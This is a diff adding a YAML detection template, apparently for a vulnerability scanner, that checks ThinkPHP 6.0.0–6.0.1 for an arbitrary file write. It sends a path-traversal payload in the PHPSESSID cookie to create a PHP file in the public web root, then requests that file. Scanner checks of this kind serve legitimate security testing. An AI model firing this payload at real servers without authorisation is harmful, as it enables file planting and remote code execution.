@@ -1,0 +1,33 @@
+id: thinkphp6-arbitrary-write
+brief:
+    title: ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write
+    by: arliya
+    level: critical
+    about: ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker can upload any script file through this vulnerability to realize remote code execution takeover.We inject payload into PHPS...
+    label:
+        - thinkphp
+        - file-upload
+        - rce
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=/../../../public/{{random_filename}}.php
+      signs:
+        - "on": word
+          has:
+            - 'Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php'
+          in: header_1
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{random_filename}}.php'
+      signs:
+        - "on": word
+          has:
+            - 'Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php'
+          in: header_1
+          need: all
